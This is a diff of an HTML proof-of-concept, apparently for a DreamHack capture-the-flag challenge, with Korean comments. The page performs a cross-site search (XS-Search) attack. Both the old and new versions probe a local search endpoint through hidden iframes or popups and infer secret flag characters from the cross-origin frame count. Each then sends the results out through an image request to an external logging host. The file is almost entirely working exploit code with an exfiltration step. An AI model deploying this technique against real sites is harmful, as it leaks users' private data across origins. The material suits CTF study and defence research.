@@ -1,82 +1,94 @@
 <!doctype html>
 <html>
-
 <head>
-    <meta charset="utf-8">
-    <title>XS-Search FLAG</title>
+  <meta charset="utf-8">
+  <title>XS-Search Step</title>
 </head>
-
 <body>
-    <h1>XS-Search</h1>
-    <pre id="log"></pre>
+  <h1>XS-Search Step PoC</h1>
+  <pre id="log"></pre>
 
-    <script>
-        const charset = "0123456789abcdef";
-        let prefix = "DH{";
-        const logEl = document.getElementById("log");
+  <script>
+    const prefix = "DH{";  // <-- 여기만 매 라운드마다 직접 바꾸면 됩니다.
 
-        function log(msg) {
-            logEl.textContent += msg + "\n";
-            console.log(msg);
+    const charset = "0123456789abcdef";
+    const logEl = document.getElementById("log");
+
+    function log(msg) {
+      logEl.textContent += msg + "\n";
+      // 콘솔 로그는 개발자 도구에서 보려고 남겨둡니다.
+      try { console.log(msg); } catch (e) {}
+    }
+
+    // 1) 문서 파싱 중에 16개의 iframe을 만들어 넣습니다.
+    (function makeIframes() {
+      for (let i = 0; i < charset.length; i++) {
+        const c = charset[i];
+        const q = prefix + c;
+
+        // search?query=prefix+c
+        const src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(q);
+
+        // document.write를 쓰면, 파서가 진행되는 동안 바로 iframe이 삽입됩니다.
+        // 이 iframe들의 로딩이 끝나야 window.onload가 호출됩니다.
+        document.write(
+          '<iframe src="' + src + '" name="f' + i + '" style="display:none;"></iframe>'
+        );
+      }
+    })();
+
+    // 2) 모든 iframe 로딩이 끝난 뒤 호출될 onload 핸들러
+    window.onload = function() {
+      log("[*] window.onload - checking candidates for prefix: " + prefix);
+
+      let hits = "";
+
+      for (let i = 0; i < charset.length; i++) {
+        let win;
+        let found = false;
+
+        try {
+          win = frames[i];           // i번째 iframe의 window
+        } catch (e) {
+          win = null;
         }
 
-        function testCandidate(candidate) {
-            return new Promise((resolve) => {
-                const url = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(candidate);
-
-                const w = window.open(url, "xssearch_window");
-
-                setTimeout(() => {
-                    let found = false;
-                    try {
-                        found = (w.length > 0);
-                    } catch (e) {
-                        found = false;
-                    }
-                    try {
-                        w.close();
-                    } catch (e) { }
-
-                    resolve(found);
-                }, 500);
-            });
+        if (win) {
+          try {
+            // cross-origin이라도 length(=frame 개수)는 읽을 수 있습니다.
+            // FLAG에 매치된 경우 search.html 안에 <iframe srcdoc="..."> 가 생겨서 length가 1이 됩니다.
+            found = (win.length > 0);
+          } catch (e) {
+            found = false;
+          }
         }
 
-        (async () => {
-            const baseOk = await testCandidate(prefix);
-            log("Test 'DH{' => " + baseOk);
+        if (found) {
+          const c = charset[i];
+          hits += c;
+          log("[+] Hit for char: " + c + " (query = " + prefix + c + ")");
+        } else {
+          const c = charset[i];
+          log("[-] Miss for char: " + c + " (query = " + prefix + c + ")");
+        }
+      }
 
-            for (let i = 0; i < 32; i++) {
-            let foundChar = false;
+      if (hits === "") {
+        log("[!] No hit found for this prefix. Something is wrong or prefix is already complete.");
+      } else {
+        log("[*] Hits: " + hits);
+      }
 
-            for (const c of charset) {
-                const candidate = prefix + c;
-                log("Try (" + i + "): " + candidate);
+      // 3) 결과를 DreamHack 로깅 도메인으로 전송
+      // hits는 보통 한 글자일 것이지만, 혹시 모르니 문자열 그대로 보냅니다.
+      const img = new Image();
+      img.src =
+        "https://czuybvd.request.dreamhack.games/log?" +
+        "prefix=" + encodeURIComponent(prefix) +
+        "&hits=" + encodeURIComponent(hits);
 
-                const ok = await testCandidate(candidate);
-                if (ok) {
-                prefix = candidate;
-                log("Extended prefix: " + prefix);
-                foundChar = true;
-                break;
-                }
-            }
-
-            // 이 자리에 맞는 문자를 못 찾았다면 뭔가 이상한 상황
-            if (!foundChar) {
-                log("No matching char at position " + i + ", stop");
-                break;
-            }
-            }
-
-            log("END. Maybe FLAG : " + prefix);
-
-            const img = new Image();
-            img.src = "https://czuybvd.request.dreamhack.games/log?flag=" + encodeURIComponent(prefix);
-
-            log("END. Maybe FLAG: " + prefix);
-        })();
-    </script>
+      log("[*] Reported to logger with prefix=" + prefix + " and hits=" + hits);
+    };
+  </script>
 </body>
-
 </html>
